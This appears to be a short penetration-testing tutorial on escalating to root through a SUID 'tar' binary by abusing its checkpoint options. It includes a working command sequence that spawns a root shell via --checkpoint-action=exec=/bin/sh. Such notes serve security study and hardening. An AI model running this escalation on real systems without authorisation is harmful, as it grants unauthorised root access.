'tar' Checkpointing Features

  • --checkpoint=NUM: Reports progress every NUM records.
  • --checkpoint-action=ACTION: Executes ACTION whenever a checkpoint is reached.
  • If tar is SUID, the ACTION will run with elevated privileges.

Exploitation Logic

  • Create a dummy file to initiate a 'tar' operation.
  • Archive the file to /dev/null to avoid actual file creation.
  • Set --checkpoint=1 and --checkpoint-action=exec=/bin/sh to execute a shell.
  • The shell inherits root privileges from the SUID 'tar' binary.
Key Takeaway

SUID 'tar' can be exploited using its checkpoint actions to execute arbitrary commands, providing a root shell through a less obvious vector.

SUID 'tar' Exploitation Example
# Assume 'tar' is SUID root

# 1. Create a dummy file
echo "whatever" > /tmp/foo

# 2. Use tar to execute a shell
tar cf /dev/null /tmp/foo --checkpoint=1 --checkpoint-action=exec=/bin/sh

# You are now in a root shell
whoami
# Expected output: root

# Exit the root shell
exit

# Clean up dummy file
rm /tmp/foo
Pro Tip: Check Man Pages

Always consult the man page for any SUID binary you're investigating. Hidden options or less-known functionalities can often be leveraged for exploitation.
